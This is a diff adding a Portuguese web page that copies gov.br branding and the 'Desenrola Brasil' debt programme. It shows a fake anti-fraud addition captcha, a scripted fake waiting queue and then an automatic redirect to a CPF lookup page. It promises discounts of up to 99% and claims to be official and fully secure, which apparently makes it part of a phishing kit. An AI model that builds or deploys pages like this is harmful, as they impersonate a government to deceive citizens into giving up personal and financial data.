@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/png" sizes="96x96" href="../icons8-brasil-windows-11-color-96.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="../icons8-brasil-windows-11-color-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="../icons8-brasil-windows-11-color-16.png">
+  <title>Verificação de Segurança — Desenrola Brasil</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../assets/css/desenrola.css">
+  <script src="../assets/js/tracking.js"></script>
+  <style>
+    body {
+      background-color: #f0f4f8;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .page-wrap {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      max-width: 600px;
+      margin: 0 auto;
+      width: 100%;
+    }
+    .crumb {
+      font-size: 13px;
+      color: #555;
+      padding: 10px 16px;
+      background: #e9eef5;
+      border-bottom: 1px solid #d8e2ec;
+    }
+    .crumb a {
+      color: #1451b4;
+      text-decoration: none;
+    }
+    .security-card {
+      background: #ffffff;
+      margin: 20px 16px;
+      padding: 32px 24px;
+      border-radius: 14px;
+      box-shadow: 0 4px 20px rgba(12, 50, 111, 0.08);
+      text-align: center;
+      border: 1px solid #e2e8f0;
+      position: relative;
+      transition: all 0.3s ease;
+    }
+    .gov-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #eef4ff;
+      color: #1451b4;
+      padding: 6px 14px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 700;
+      margin-bottom: 18px;
+      border: 1px solid #c9dcff;
+    }
+    .gov-badge.queue-badge {
+      background: #ecfdf5;
+      color: #065f46;
+      border-color: #a7f3d0;
+    }
+    .gov-badge svg {
+      width: 15px;
+      height: 15px;
+    }
+    .card-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #0c326f;
+      line-height: 1.35;
+      margin-bottom: 10px;
+    }
+    .card-desc {
+      font-size: 14.5px;
+      color: #4b5563;
+      line-height: 1.5;
+      max-width: 440px;
+      margin: 0 auto 24px;
+    }
+    .math-box {
+      background: linear-gradient(135deg, #f8fafc 0%, #edf2f7 100%);
+      border: 2px dashed #cbd5e1;
+      border-radius: 12px;
+      padding: 20px 16px;
+      margin-bottom: 22px;
+    }
+    .math-label {
+      font-size: 12.5px;
+      font-weight: 700;
+      color: #64748b;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      margin-bottom: 8px;
+    }
+    .math-equation {
+      font-size: 34px;
+      font-weight: 800;
+      color: #1451b4;
+      letter-spacing: 2px;
+      user-select: none;
+    }
+    .options-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      max-width: 380px;
+      margin: 0 auto;
+    }
+    .btn-option {
+      background: #ffffff;
+      color: #0c326f;
+      border: 2px solid #cbd5e1;
+      border-radius: 10px;
+      padding: 16px 12px;
+      font-size: 22px;
+      font-weight: 800;
+      cursor: pointer;
+      font-family: inherit;
+      transition: all 0.15s ease;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.04);
+      outline: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+    .btn-option:hover {
+      border-color: #1451b4;
+      background: #f0f6ff;
+      transform: translateY(-2px);
+      box-shadow: 0 4px 10px rgba(20, 81, 180, 0.15);
+    }
+    .btn-option:active {
+      transform: translateY(0);
+    }
+    .btn-option.correct {
+      background: #10b981 !important;
+      border-color: #059669 !important;
+      color: #ffffff !important;
+      animation: pulseGreen 0.4s ease;
+    }
+    .btn-option.wrong {
+      background: #ef4444 !important;
+      border-color: #dc2626 !important;
+      color: #ffffff !important;
+      animation: shake 0.4s ease;
+    }
+    .btn-option:disabled {
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+    .btn-option.correct:disabled {
+      opacity: 1;
+    }
+    .feedback-msg {
+      min-height: 24px;
+      margin-top: 16px;
+      font-size: 14px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: opacity 0.2s ease;
+    }
+    .feedback-msg.error {
+      color: #dc2626;
+    }
+
+    /* Tela de Fila de Espera */
+    .queue-container {
+      display: none;
+      animation: fadeIn 0.4s ease;
+    }
+    .queue-box {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 24px 16px;
+      margin: 18px 0;
+      text-align: center;
+    }
+    .queue-timer-num {
+      font-size: 48px;
+      font-weight: 800;
+      color: #1451b4;
+      line-height: 1;
+      margin: 10px 0 4px;
+      font-feature-settings: "tnum";
+      font-variant-numeric: tabular-nums;
+    }
+    .queue-timer-label {
+      font-size: 13px;
+      color: #64748b;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .progress-track {
+      width: 100%;
+      height: 10px;
+      background: #e2e8f0;
+      border-radius: 999px;
+      margin: 18px 0 14px;
+      overflow: hidden;
+      position: relative;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #1451b4 0%, #10b981 100%);
+      border-radius: 999px;
+      transition: width 1s linear;
+    }
+    .queue-status-text {
+      font-size: 13.5px;
+      color: #334155;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .spinner-dot {
+      width: 8px;
+      height: 8px;
+      background-color: #10b981;
+      border-radius: 50%;
+      display: inline-block;
+      animation: blink 1.2s infinite ease-in-out;
+    }
+    .queue-info-card {
+      background: #eff6ff;
+      border-left: 4px solid #1451b4;
+      padding: 12px 14px;
+      border-radius: 6px;
+      text-align: left;
+      font-size: 13px;
+      color: #1e3a8a;
+      line-height: 1.45;
+      margin-top: 16px;
+    }
+
+    .security-notice {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: 26px;
+      padding-top: 18px;
+      border-top: 1px solid #f1f5f9;
+    }
+    .security-notice svg {
+      color: #10b981;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      20%, 60% { transform: translateX(-6px); }
+      40%, 80% { transform: translateX(6px); }
+    }
+    @keyframes pulseGreen {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.3; transform: scale(0.7); }
+    }
+  </style>
+</head>
+<body>
+  <div class="page-wrap">
+    <!-- Header Oficial Gov.br -->
+    <header class="hdr">
+      <a href="../cpf/" class="hdr-logo-link" aria-label="gov.br">
+        <img src="../assets/img/iconegov.png" alt="gov.br" class="hdr-logo-img" width="100" height="32">
+      </a>
+      <div class="hdr-right">
+        <button type="button" class="hdr-icon-btn hdr-icon-btn--contrast" aria-label="Alto contraste" title="Contraste">
+          <svg class="hdr-ico-split-contrast" width="22" height="22" viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="9.25" fill="none" stroke="#1451B4" stroke-width="1.15"></circle>
+            <path fill="#1451B4" d="M12 2.75 A9.25 9.25 0 0 0 12 21.25 z"></path>
+            <path fill="#ffffff" d="M12 2.75 A9.25 9.25 0 0 1 12 21.25 z"></path>
+          </svg>
+        </button>
+        <button type="button" class="btn-entrar" aria-label="Acesso Seguro">
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+            <path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"></path>
+          </svg>
+          Segurança
+        </button>
+      </div>
+    </header>
+
+    <div class="crumb">
+      Portal <span aria-hidden="true"> &gt; </span> Verificação Humana <span aria-hidden="true"> &gt; </span> Desenrola Brasil
+    </div>
+
+    <!-- Card de Verificação e Fila -->
+    <section class="security-card">
+      
+      <!-- ETAPA 1: PERGUNTA DE SOMA -->
+      <div id="stepVerification">
+        <div class="gov-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          Verificação Antifraude Oficial
+        </div>
+
+        <h1 class="card-title">Confirme que você é humano</h1>
+        <p class="card-desc">
+          Para proteger o sistema e liberar o acesso à renegociação de dívidas com até 99% de desconto, resolva a soma abaixo:
+        </p>
+
+        <div class="math-box">
+          <div class="math-label">Pergunta de segurança</div>
+          <div class="math-equation" id="equationText">...</div>
+        </div>
+
+        <div class="options-grid" id="optionsGrid">
+          <!-- Botões de respostas gerados dinamicamente via JS -->
+        </div>
+
+        <div class="feedback-msg" id="feedbackMsg"></div>
+      </div>
+
+      <!-- ETAPA 2: FILA DE ESPERA (10 SEGUNDOS) -->
+      <div id="stepQueue" class="queue-container">
+        <div class="gov-badge queue-badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+          Identidade Humana Validada
+        </div>
+
+        <h2 class="card-title">Você está na fila de atendimento</h2>
+        <p class="card-desc">
+          Conectando você de forma prioritária aos servidores de consulta de descontos do Desenrola Brasil.
+        </p>
+
+        <div class="queue-box">
+          <div class="queue-timer-label">Liberando seu acesso em</div>
+          <div class="queue-timer-num" id="queueTimer">10</div>
+          <div class="queue-timer-label">segundos</div>
+
+          <div class="progress-track">
+            <div class="progress-bar" id="progressBar"></div>
+          </div>
+
+          <div class="queue-status-text">
+            <span class="spinner-dot"></span>
+            <span id="queueStatus">Preparando seu formulário oficial de consulta...</span>
+          </div>
+        </div>
+
+        <div class="queue-info-card">
+          <strong>Atenção:</strong> Mantenha esta página aberta. Assim que a contagem terminar, você será encaminhado automaticamente para a consulta por CPF.
+        </div>
+      </div>
+
+      <div class="security-notice">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+          <polyline points="9 12 11 14 15 10"></polyline>
+        </svg>
+        Ambiente 100% Seguro e Criptografado
+      </div>
+    </section>
+
+    <!-- Rodapé Oficial gov.br -->
+    <footer class="site-ft">
+      <div class="site-ft-inner">
+        <img src="../assets/img/iconefooter.png" alt="gov.br" class="ft-gov-img" width="120" height="40">
+        <div class="copy-block">
+          <p>Todo o conteúdo deste site está publicado sob a licença</p>
+          <strong>Sistema de Renegociação — Todos os direitos reservados</strong>
+        </div>
+      </div>
+    </footer>
+  </div>
+
+  <script>
+    (function () {
+      // Lista de pares de números fáceis (1+2, 2+2, 3+3, 4+4, 1+2, 5+5, etc.)
+      var easyPairs = [
+        [1, 2], [2, 1],
+        [2, 2],
+        [3, 3],
+        [4, 4],
+        [5, 5],
+        [2, 3], [3, 2],
+        [1, 3], [3, 1],
+        [1, 4], [4, 1],
+        [2, 4], [4, 2],
+        [3, 4], [4, 3],
+        [1, 5], [5, 1],
+        [2, 5], [5, 2]
+      ];
+
+      var stepVerification = document.getElementById('stepVerification');
+      var stepQueue = document.getElementById('stepQueue');
+      var equationEl = document.getElementById('equationText');
+      var optionsGrid = document.getElementById('optionsGrid');
+      var feedbackMsg = document.getElementById('feedbackMsg');
+      var queueTimer = document.getElementById('queueTimer');
+      var progressBar = document.getElementById('progressBar');
+      var queueStatus = document.getElementById('queueStatus');
+
+      var currentCorrectAnswer = null;
+      var isAnswering = false;
+
+      function shuffle(arr) {
+        var a = arr.slice();
+        for (var i = a.length - 1; i > 0; i--) {
+          var j = Math.floor(Math.random() * (i + 1));
+          var temp = a[i];
+          a[i] = a[j];
+          a[j] = temp;
+        }
+        return a;
+      }
+
+      function generateQuestion() {
+        isAnswering = false;
+        feedbackMsg.textContent = '';
+        feedbackMsg.className = 'feedback-msg';
+
+        var pair = easyPairs[Math.floor(Math.random() * easyPairs.length)];
+        var num1 = pair[0];
+        var num2 = pair[1];
+        currentCorrectAnswer = num1 + num2;
+
+        equationEl.textContent = num1 + ' + ' + num2 + ' = ?';
+
+        // Gera 3 opções falsas próximas e únicas
+        var optionsSet = new Set();
+        optionsSet.add(currentCorrectAnswer);
+
+        var offsets = [-2, -1, 1, 2, 3, -3];
+        var shuffledOffsets = shuffle(offsets);
+
+        for (var i = 0; i < shuffledOffsets.length && optionsSet.size < 4; i++) {
+          var candidate = currentCorrectAnswer + shuffledOffsets[i];
+          if (candidate > 0 && candidate !== currentCorrectAnswer) {
+            optionsSet.add(candidate);
+          }
+        }
+
+        var fallback = 1;
+        while (optionsSet.size < 4) {
+          if (!optionsSet.has(fallback)) {
+            optionsSet.add(fallback);
+          }
+          fallback++;
+        }
+
+        var optionsArray = shuffle(Array.from(optionsSet));
+
+        optionsGrid.innerHTML = '';
+        optionsArray.forEach(function (val) {
+          var btn = document.createElement('button');
+          btn.type = 'button';
+          btn.className = 'btn-option';
+          btn.textContent = val;
+          btn.setAttribute('data-val', val);
+          btn.addEventListener('click', function () {
+            handleAnswer(val, btn);
+          });
+          optionsGrid.appendChild(btn);
+        });
+      }
+
+      function startQueueCountdown() {
+        // Transição suave para a tela de fila
+        stepVerification.style.display = 'none';
+        stepQueue.style.display = 'block';
+
+        var totalSeconds = 10;
+        var remaining = totalSeconds;
+        queueTimer.textContent = remaining;
+        progressBar.style.width = '0%';
+
+        var statusMessages = [
+          { at: 9, msg: 'Conectando ao sistema seguro do Desenrola Brasil...' },
+          { at: 6, msg: 'Sua vaga prioritária foi reservada com sucesso...' },
+          { at: 3, msg: 'Carregando formulário oficial de consulta...' },
+          { at: 0, msg: 'Acesso liberado! Redirecionando...' }
+        ];
+
+        var interval = setInterval(function () {
+          remaining--;
+          if (remaining < 0) remaining = 0;
+
+          queueTimer.textContent = remaining;
+          var percent = Math.round(((totalSeconds - remaining) / totalSeconds) * 100);
+          progressBar.style.width = percent + '%';
+
+          for (var i = 0; i < statusMessages.length; i++) {
+            if (remaining <= statusMessages[i].at) {
+              queueStatus.textContent = statusMessages[i].msg;
+            }
+          }
+
+          if (remaining <= 0) {
+            clearInterval(interval);
+            setTimeout(function () {
+              var target = '../cpf/';
+              if (typeof window.gvdesenrolaAppendQuery === 'function') {
+                window.location.href = window.gvdesenrolaAppendQuery(target);
+              } else {
+                window.location.href = target + window.location.search;
+              }
+            }, 400);
+          }
+        }, 1000);
+      }
+
+      function handleAnswer(selectedVal, clickedBtn) {
+        if (isAnswering) return;
+        isAnswering = true;
+
+        var allButtons = optionsGrid.querySelectorAll('.btn-option');
+
+        if (selectedVal === currentCorrectAnswer) {
+          clickedBtn.classList.add('correct');
+          allButtons.forEach(function (b) { b.disabled = true; });
+
+          // Aguarda 500ms para o usuário ver o botão verde e inicia a contagem da fila
+          setTimeout(function () {
+            startQueueCountdown();
+          }, 500);
+        } else {
+          clickedBtn.classList.add('wrong');
+          feedbackMsg.className = 'feedback-msg error';
+          feedbackMsg.innerHTML = '✖ Resposta incorreta. Tente novamente.';
+
+          setTimeout(function () {
+            generateQuestion();
+          }, 1100);
+        }
+      }
+
+      generateQuestion();
+    })();
+  </script>
+</body>
+</html>
